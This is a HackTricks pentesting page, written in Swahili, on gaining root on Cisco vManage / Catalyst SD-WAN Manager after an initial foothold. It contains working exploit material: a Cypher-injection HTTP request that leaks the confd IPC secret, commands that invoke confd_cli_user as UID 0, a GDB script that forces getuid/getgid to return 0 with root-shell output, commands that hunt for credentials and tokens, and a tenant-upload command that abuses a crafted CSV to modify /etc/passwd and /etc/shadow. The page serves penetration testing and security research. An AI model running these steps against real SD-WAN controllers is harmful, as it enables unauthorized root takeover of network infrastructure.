# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Mara tu unapopata code execution kwenye Cisco vManage / *Catalyst SD-WAN Manager* kama `vmanage`, `netadmin`, au `vmanage-admin`, maeneo muhimu zaidi ya local privesc kwa kawaida huwa ni `confd` CLI stack, helper ya `cmdptywrapper`, localhost REST APIs, na root-owned import/upload handlers.

Ikiwa bado unahitaji **initial foothold** kwenye controller, kwanza angalia ukurasa maalum wa control-plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Uchunguzi wa haraka wa ndani
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Ikiwa `/etc/confd/confd_ipc_secret` inasomeka kutoka kwenye foothold yako, Path 1 na Path 2 huwa za kutekelezeka mara moja. Ikiwa uliwasili kupitia remote info leak au webshell, pia angalia kama tayari unaweza kufikia material ya `vmanage-admin` SSH au multitenancy upload handlers: utafiti wa 2026 ulionyesha kuwa zote mbili zilikuwa hatua za mpito zenye uhalisia.

## Path 1

(Mfano kutoka [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))<sup>[[5]](#references)</sup>

Baada ya kuchunguza kidogo baadhi ya [nyaraka](http://66.218.245.39/doc/html/rn03re18.html) zinazohusiana na `confd` na binaries mbalimbali (zinazoweza kufikiwa kwa kutumia account kwenye tovuti ya Cisco), tuligundua kwamba ili kuthibitisha IPC socket, hutumia siri iliyo katika `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Kumbuka instance yetu ya Neo4j? Inaendeshwa kwa privileges za mtumiaji `vmanage`, hivyo kuturuhusu kupata faili kwa kutumia vulnerability ya awali:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Programu ya `confd_cli` haitumii command line arguments lakini huita `/usr/bin/confd_cli_user` ikiwa na arguments. Kwa hiyo, tunaweza kuita `/usr/bin/confd_cli_user` moja kwa moja kwa kutumia seti yetu wenyewe ya arguments. Hata hivyo, haiwezi kusomeka kwa privileges tulizo nazo sasa, kwa hivyo tunapaswa kuipata kutoka kwenye rootfs na kui-copy kwa kutumia scp, kusoma help, na kuitumia kupata shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Njia ya 2

(Mfano kutoka [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))<sup>[[6]](#references)</sup>

Blog<sup>[[5]](#references)</sup> ya timu ya synacktiv ilieleza njia maridadi ya kupata root shell, lakini kikwazo ni kwamba inahitaji kupata nakala ya `/usr/bin/confd_cli_user`, ambayo inaweza kusomwa na root pekee. Nilipata njia nyingine ya ku-escalate hadi root bila usumbufu huo.

Nilipodisassemble binary ya `/usr/bin/confd_cli`, niliona yafuatayo:

<details>
<summary>Objdump inayoonyesha ukusanyaji wa UID/GID</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Nilipoendesha “ps aux”, niliona yafuatayo (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Nilidharia kuwa programu ya “confd_cli” hupitisha user ID na group ID iliyokusanya kutoka kwa mtumiaji aliyeingia kwenye application ya “cmdptywrapper”.

Jaribio langu la kwanza lilikuwa kuendesha “cmdptywrapper” moja kwa moja na kuipatia `-g 0 -u 0`, lakini lilishindikana. Inaonekana file descriptor (-i 1015) iliundwa mahali fulani katika mchakato huo, na siwezi kuighushi.

Kama ilivyotajwa kwenye blog ya synacktiv (mfano wa mwisho), programu ya `confd_cli` haiungi mkono command line argument, lakini ninaweza kuiathiri kwa kutumia debugger, na kwa bahati nzuri GDB imejumuishwa kwenye mfumo.

Niliunda GDB script ambapo nililazimisha API `getuid` na `getgid` zirudishe 0. Kwa kuwa tayari nina privilege ya “vmanage” kupitia deserialization RCE, nina ruhusa ya kusoma `/etc/confd/confd_ipc_secret` moja kwa moja.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Matokeo ya Console:

<details>
<summary>Matokeo ya Console</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco baadaye iliandika njia safi zaidi ya kupata root ya ndani katika ushauri wake kuhusu [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): **authenticated attacker aliye na read-only privileges pekee** angeweza kutuma request iliyoundwa maalum kwenye manager CLI na kupata root kutokana na input validation isiyotosha.<sup>[[7]](#references)</sup>

Kwa mtazamo wa offensive, jambo muhimu la kukumbuka ni hili:

1. Mara tu unapokuwa na *low-priv foothold* yoyote kwenye box, unapaswa ku-test local CLI service kabla ya kuanza workflow nzito ya Path 1 / Path 2.
2. Tumia tena artifacts kutoka Path 2 ili kupata trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Chukulia kila field inayotumwa kwenye CLI backend kuwa ya kutiliwa shaka: UID/GID, username, terminal metadata, imported files, au value yoyote itakayotumiwa baadaye na root-owned helper.
4. Ikiwa low-priv user anaweza kufikia local CLI socket na kuathiri fields hizo, root inaweza kuwa imebaki one crafted request tu.

Workflow ya kivitendo baada ya kufanikiwa kuingia kwenye appliance ni:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Hii inabadilisha bug ya 2025 kuwa pattern nzuri ya hunting kwa matoleo yanayofanana: tafuta **local CLI shims zinazokusanya utambulisho katika userland na kuuforward kwa wrapper yenye privileges za juu zaidi**.

Usichanganye **CVE-2025-20122** na **CVE-2026-20122** iliyotokea baadaye: issue ya 2025 ni *local* CLI-to-root bug, ilhali issue ya 2026 ni *remote* API arbitrary file overwrite ambayo inafaa zaidi kwa kupanda foothold, kisha kurudi kwenye Path 1 / Path 2 / Path 4.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco's February 2026 advisory pia ilianzisha class nyingine muhimu ya privesc: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) ilimwezesha **local attacker aliyethibitishwa mwenye privileges za chini** kupata root kutokana na insufficient user-authentication mechanism katika REST API.<sup>[[1]](#references)</sup>

Hili ni muhimu kwa sababu vManage privesc sasa haijazuiliwa tena kwa abuse ya `confd`/TTY. Baada ya kupata low-priv shell, pia tafuta:

- localhost-only API endpoints zinazomwamini caller kupita kiasi
- tokens, cookies, au service credentials zinazoweza kusomeka kutoka kwenye account ya sasa
- root-only actions zilizo exposed kupitia `dataservice`/REST handlers ambazo bado zinaweza ku-triggeriwa locally

Kwa vitendo, unapokuwa na shell kama `vmanage` au service user mwingine, local API abuse mara nyingi huwa tulivu zaidi na rahisi ku-automate kuliko interactive CLI abuse:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Ikiwa context ya session ya ndani inatosha kufikia REST functionality yenye privileged access, pendelea njia ya API: ni rahisi zaidi kuireplay, kuiscript, na kuiunganisha na web sessions au API tokens zilizoibwa.

## Njia ya 5 (2026 crafted file iliyochakatwa na root - CVE-2026-20245)

Pattern nyingine ya hivi karibuni ni [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): attacker wa ndani mwenye privileges za `netadmin` angeweza kupakia **crafted file** ambayo CLI baadaye iliishughulikia bila usalama, na kusababisha command injection kama `root`.<sup>[[2]](#references)</sup>

Kwa mtazamo wa HackTricks, technique yenye thamani ni pana zaidi kuliko CVE hiyo mahususi:

1. Enumerate kila CLI au web workflow inayokubali file: imports, diagnostic bundles, templates, validators, backups, tenant data, n.k.
2. Fuatilia file iliyopakiwa inaishia wapi na ni script au binary gani inayomilikiwa na root inayoitumia.
3. Test kama filename, file content, au parsed metadata hupitishwa wakati wowote kwa shell commands, wrapper scripts, au helpers za aina ya `system()`.
4. Ikiwa tayari unaweza kufikia `netadmin` (valid creds, stolen session, au auth-bypass chain), bugs za file-processing mara nyingi huwa njia ya haraka zaidi ya kufikia root.

Google Cloud / Mandiant baadaye walionyesha instance halisi ya bug class hii ikitumiwa kupitia multitenancy import path:<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
Katika shambulio lililozingatiwa, CSV iliyoundwa mahsusi iliishia kurekebisha `/etc/passwd` na `/etc/shadow` na kuunda akaunti ya muda yenye UID 0 (`troot`).<sup>[[4]](#references)</sup> Hilo linafanya waingizaji wa aina ya `tenant-upload` / `tenant-list` kuwa wa kuvutia zaidi: si vipengele vya kuingiza data tu, bali pia front-end za parser zinazomilikiwa na root.

Muundo wa haraka wa utafutaji upande wa shell ni:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Aina hii ya bug huunganishwa vizuri hasa na remote footholds zinazokupa `netadmin` lakini si `root`.

## Other recent vManage/Catalyst SD-WAN Manager vulns to chain

- **Unauthenticated info leak (CVE-2026-20133)** – Ni ya thamani kubwa hasa kwa sababu utafiti wa umma ulionyesha kuwa inaweza kufichua `confd_ipc_secret` au private key ya `vmanage-admin`, na kubadilisha read bug kuwa Path 1 au NETCONF pivot.<sup>[[3]](#references)</sup>
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – Ni tofauti na 2025 CLI bug iliyo hapo juu; VulnCheck iliitumia kupakia webshell, ambayo hufanya local privesc paths kwenye ukurasa huu kuwa muhimu mara moja.<sup>[[3]](#references)</sup>
- **Authenticated UI XSS (CVE-2024-20475)** – Iba admin session kwenye web UI, kisha pivot kwenda kwenye API/CLI actions ambazo hatimaye zinafikia `vshell` au mojawapo ya local privesc paths zilizo hapo juu.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Ni precursor yenye nguvu sana kwa Path 5 kwa sababu `netadmin` ndiyo level inayohitajika na 2026 crafted-file privesc.<sup>[[3]](#references)</sup>
- **Authenticated arbitrary file write (CVE-2026-20262)** – Ina offensive value inayofanana na CVE-2026-20122 lakini kupitia later web UI upload path: andika kwenye location ambayo baadaye itaparseriwa na root au management-plane web tier.
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – Intrusions za 2026 zilionyesha kuwa attackers wanaweza kurudisha mfumo kwenye older vulnerable SD-WAN build, kutumia old CLI root bug, kisha kurejesha original version.<sup>[[8]](#references)</sup>
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Imeelezwa vizuri zaidi kwenye dedicated SD-WAN control-plane page; inaweza kuongeza SSH key ya `vmanage-admin`, na kukupa local foothold inayohitajika kuirejea page hii.



## References

- [1] [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Pentesting Cisco SD-WAN Part 1: Attacking vManage](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Hacking Cisco SD-WAN vManage 19.2.2 — From CSRF to Remote Code Execution](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [Active exploitation of Cisco Catalyst SD-WAN by UAT-8616 (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)

{{#include ../../banners/hacktricks-training.md}}
